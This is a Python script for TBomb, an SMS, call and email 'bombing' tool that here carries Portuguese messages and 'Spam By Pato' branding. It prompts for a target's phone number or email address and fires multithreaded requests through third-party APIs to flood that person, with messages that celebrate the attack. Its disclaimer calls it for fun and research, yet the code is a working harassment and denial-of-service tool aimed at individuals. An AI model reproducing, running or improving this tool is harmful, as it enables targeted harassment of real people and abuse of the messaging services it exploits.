#!/usr/bin/python
# -*- coding: UTF-8 -*-

import os
import shutil
import sys
import subprocess
import string
import random
import json
import re
import time
import argparse

from concurrent.futures import ThreadPoolExecutor, as_completed

from utils.decorators import MessageDecorator
from utils.provider import APIProvider

try:
    import requests
    from colorama import Fore, Style
except ImportError:
    print("\tSome dependencies could not be imported (possibly not installed)")
    print(
        "Type `pip3 install -r requirements.txt` to "
        " install all required packages")
    sys.exit(1)


def readisdc():
    with open("isdcodes.json") as file:
        isdcodes = json.load(file)
    return isdcodes


def get_version():
    try:
        return open(".version", "r").read().strip()
    except Exception:
        return '1.0'


def clr():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


def bann_text():
    clr()
    logo = """
 ______                    _______  _______ _________ _______ 
(  ___ \ |\     /|        (  ____ )(  ___  )\__   __/(  ___  )
| (   ) )( \   / )        | (    )|| (   ) |   ) (   | (   ) |
| (__/ /  \ (_) /         | (____)|| (___) |   | |   | |   | |
|  __ (    \   /          |  _____)|  ___  |   | |   | |   | |
| (  \ \    ) (           | (      | (   ) |   | |   | |   | |
| )___) )   | |           | )      | )   ( |   | |   | (___) |
|/ \___/    \_/           |/       |/     \|   )_(   (_______)
                                         """
    version = "Version: "+__VERSION__
    contributors = "Contributors: "+" ".join(__CONTRIBUTORS__)
    print(random.choice(ALL_COLORS) + logo + RESET_ALL)
    mesgdcrt.SuccessMessage(version)
    mesgdcrt.SectionMessage(contributors)
    print()


def check_intr():
    try:
        requests.get("https://motherfuckingwebsite.com")
    except Exception:
        bann_text()
        mesgdcrt.FailureMessage("Poor internet connection detected")
        sys.exit(2)


def format_phone(num):
    num = [n for n in num if n in string.digits]
    return ''.join(num).strip()


def do_zip_update():
    success = False

    # Download Zip from git
    # Unzip and overwrite the current folder

    if success:
        mesgdcrt.SuccessMessage("TBomb was updated to the latest version")
        mesgdcrt.GeneralMessage(
            "Please run the script again to load the latest version")
    else:
        mesgdcrt.FailureMessage("Unable to update TBomb.")
        mesgdcrt.WarningMessage(
            "Grab The Latest one From https://github.com/TheSpeedX/TBomb.git")

    sys.exit()


def do_git_update():
    success = False
    try:
        print(ALL_COLORS[0]+"UPDATING "+RESET_ALL, end='')
        process = subprocess.Popen("git checkout . && git pull ",
                                   shell=True,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.STDOUT)
        while process:
            print(ALL_COLORS[0]+'.'+RESET_ALL, end='')
            time.sleep(1)
            returncode = process.poll()
            if returncode is not None:
                break
        success = not process.returncode
    except Exception:
        success = False
    print("\n")

    if success:
        mesgdcrt.SuccessMessage("Atualizado")
        mesgdcrt.GeneralMessage(
            "Execute o script novamente para carregar a versão mais recente")
    else:
        mesgdcrt.FailureMessage("Unable to update TBomb.")
        mesgdcrt.WarningMessage("Make Sure To Install 'git' ")
        mesgdcrt.GeneralMessage("Then run command:")
        print(
            "git checkout . && "
            "git pull https://github.com/TheSpeedX/TBomb.git HEAD")
    sys.exit()


def update():
    if shutil.which('git'):
        do_git_update()
    else:
        do_zip_update()


def check_for_updates():
    mesgdcrt.SectionMessage("Checking for updates")
    fver = requests.get(
            "https://raw.githubusercontent.com/TheSpeedX/TBomb/master/.version"
            ).text.strip()
    if fver != __VERSION__:
        mesgdcrt.WarningMessage("An update is available")
        mesgdcrt.GeneralMessage("Starting update...")
        update()
    else:
        mesgdcrt.SuccessMessage("TBomb is up-to-date")
        mesgdcrt.GeneralMessage("Ja vai começar o atake kkkkkkkkkkkkkkk")


def notifyen():
    try:
        noti = requests.get(
            "https://raw.githubusercontent.com/TheSpeedX/TBomb/master/.notify"
            ).text.upper()
        if len(noti) > 10:
            mesgdcrt.SectionMessage("NOTIFICAÇÃO: " + noti)
            print()
    except Exception:
        pass


def get_phone_info():
    while True:
        target = ""
        cc = input(mesgdcrt.CommandMessage(
            "Digite o código do seu país (sem +): "))
        cc = format_phone(cc)
        if not country_codes.get(cc, False):
            mesgdcrt.WarningMessage(
                "O código do país ({cc}) que você inseriu"
                " é inválido ou não é compatível".format(cc=cc))
            continue
        target = input(mesgdcrt.CommandMessage(
            "Bota o numero do alvo: +" + cc + " "))
        target = format_phone(target)
        if ((len(target) <= 6) or (len(target) >= 12)):
            mesgdcrt.WarningMessage(
                "O numero do telefone e ({target})".format(target=target) +
                "Invalido poha")
            continue
        return (cc, target)


def get_mail_info():
    mail_regex = r'^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$'
    while True:
        target = input(mesgdcrt.CommandMessage("Enter target mail: "))
        if not re.search(mail_regex, target, re.IGNORECASE):
            mesgdcrt.WarningMessage(
                "The mail ({target})".format(target=target) +
                " Testes, invalido")
            continue
        return target


def pretty_print(cc, target, success, failed):
    requested = success+failed
    mesgdcrt.SectionMessage("O Spam está em andamento - seja paciente krlh")
    mesgdcrt.GeneralMessage(
        "Fique conectado à internet durante o spam")
    mesgdcrt.GeneralMessage("Alvo       : " + cc + " " + target)
    mesgdcrt.GeneralMessage("Tentatinas         : " + str(requested))
    mesgdcrt.GeneralMessage("enviados   : " + str(success))
    mesgdcrt.GeneralMessage("Falhados       : " + str(failed))
    mesgdcrt.WarningMessage(
        "Esta ferramenta foi feita apenas para fins divertidos e de pesquisa")
    mesgdcrt.SuccessMessage("Spam By Pato")


def workernode(mode, cc, target, count, delay, max_threads):

    api = APIProvider(cc, target, mode, delay=delay)
    clr()
    mesgdcrt.SectionMessage("Preparando o Spaam - seja paciente")
    mesgdcrt.GeneralMessage(
        "Fique conectado à internet durante o Spam")
    mesgdcrt.GeneralMessage("API Version   : " + api.api_version)
    mesgdcrt.GeneralMessage("Alvo        : " + cc + target)
    mesgdcrt.GeneralMessage("Quantidade de spam        : " + str(count))
    mesgdcrt.GeneralMessage("Threads       : " + str(max_threads) + " threads")
    mesgdcrt.GeneralMessage("Delei         : " + str(delay) +
                            " Segundos")
    mesgdcrt.WarningMessage(
        "Esta ferramenta foi feita apenas para fins divertidos e de pesquisa")
    print()
    input(mesgdcrt.CommandMessage(
        "Pressione [CTRL + Z] para suspender o bombardeiro ou [ENTER] para reiniciá-lo"))

    if len(APIProvider.api_providers) == 0:
        mesgdcrt.FailureMessage("Seu país / destino ainda não é compatível")
        mesgdcrt.GeneralMessage("Sinta-se à vontade para nos contactar")
        input(mesgdcrt.CommandMessage("Pressione [ENTER] para sair"))
        bann_text()
        sys.exit()

    success, failed = 0, 0
    while success < count:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            jobs = []
            for i in range(count-success):
                jobs.append(executor.submit(api.hit))

            for job in as_completed(jobs):
                result = job.result()
                if result is None:
                    mesgdcrt.FailureMessage(
                        "O limite de bombardeio do seu alvo foi atingido")
                    mesgdcrt.GeneralMessage("Tente mais tarde !!")
                    input(mesgdcrt.CommandMessage("Pressione [ENTER] para sair"))
                    bann_text()
                    sys.exit()
                if result:
                    success += 1
                else:
                    failed += 1
                clr()
                pretty_print(cc, target, success, failed)
    print("\n")
    mesgdcrt.SuccessMessage("Spam Completo kkkkkk")
    time.sleep(1.5)
    bann_text()
    sys.exit()


def selectnode(mode="sms"):
    mode = mode.lower().strip()
    try:
        clr()
        bann_text()
        check_intr()
        check_for_updates()
        notifyen()

        max_limit = {"sms": 500, "call": 15, "mail": 200}
        cc, target = "", ""
        if mode in ["sms", "call"]:
            cc, target = get_phone_info()
            if cc != "91":
                max_limit.update({"sms": 100})
        elif mode == "mail":
            target = get_mail_info()
        else:
            raise KeyboardInterrupt

        limit = max_limit[mode]
        while True:
            try:
                message = ("Enter number of {type}".format(type=mode.upper()) +
                           " to send (Max {limit}): ".format(limit=limit))
                count = int(input(mesgdcrt.CommandMessage(message)).strip())
                if count > limit or count == 0:
                    mesgdcrt.WarningMessage("You have requested " + str(count)
                                            + " {type}".format(
                                                type=mode.upper()))
                    mesgdcrt.GeneralMessage(
                        "Automatically capping the value"
                        " to {limit}".format(limit=limit))
                    count = limit
                delay = float(input(
                    mesgdcrt.CommandMessage("Enter delay time (in seconds): "))
                    .strip())
                # delay = 0
                max_threads = int(input(
                    mesgdcrt.CommandMessage(
                        "Enter Number of Thread (Recommended: 10): "))
                    .strip())
                if (count < 0 or delay < 0):
                    raise Exception
                break
            except KeyboardInterrupt as ki:
                raise ki
            except Exception:
                mesgdcrt.FailureMessage("Read Instructions Carefully !!!")
                print()

        workernode(mode, cc, target, count, delay, max_threads)
    except KeyboardInterrupt:
        mesgdcrt.WarningMessage("Received INTR call - Exiting...")
        sys.exit()


mesgdcrt = MessageDecorator("icon")
if sys.version_info[0] != 3:
    mesgdcrt.FailureMessage("TBomb will work only in Python v3")
    sys.exit()

try:
    country_codes = readisdc()["isdcodes"]
except FileNotFoundError:
    update()


__VERSION__ = get_version()
__CONTRIBUTORS__ = ['SpeedX', 't0xic0der', 'scpketer', 'Stefan']

ALL_COLORS = [Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.BLUE,
              Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
RESET_ALL = Style.RESET_ALL

description = """TBomb - Your Friendly Spammer Application

TBomb can be used for many purposes which incudes -
\t Exposing the vulnerable APIs over Internet
\t Friendly Spamming
\t Testing Your Spam Detector and more ....

TBomb is not intented for malicious uses.
"""

parser = argparse.ArgumentParser(description=description,
                                 epilog='Coded by SpeedX !!!')
parser.add_argument("-sms", "--sms", action="store_true",
                    help="start TBomb with SMS Bomb mode")
parser.add_argument("-call", "--call", action="store_true",
                    help="start TBomb with CALL Bomb mode")
parser.add_argument("-mail", "--mail", action="store_true",
                    help="start TBomb with MAIL Bomb mode")
parser.add_argument("-u", "--update", action="store_true",
                    help="update TBomb")
parser.add_argument("-c", "--contributors", action="store_true",
                    help="show current TBomb contributors")
parser.add_argument("-v", "--version", action="store_true",
                    help="show current TBomb version")


if __name__ == "__main__":
    args = parser.parse_args()
    if args.version:
        print("Version: ", __VERSION__)
    elif args.contributors:
        print("Contributors: ", " ".join(__CONTRIBUTORS__))
    elif args.update:
        update()
    elif args.mail:
        selectnode(mode="mail")
    elif args.call:
        selectnode(mode="call")
    elif args.sms:
        selectnode(mode="sms")
    else:
        choice = ""
        avail_choice = {"1": "SMS", "2": "CALL", "3": "MAIL (Not Yet Available)"}
        try:
            while (choice not in avail_choice):
                clr()
                bann_text()
                print("Available Options:\n")
                for key, value in avail_choice.items():
                    print("[ {key} ] {value} BOMB".format(key=key,
                                                          value=value))
                print()
                choice = input(mesgdcrt.CommandMessage("Enter Choice : "))
            selectnode(mode=avail_choice[choice].lower())
        except KeyboardInterrupt:
            mesgdcrt.WarningMessage("Received INTR call - Exiting...")
            sys.exit()
    sys.exit()
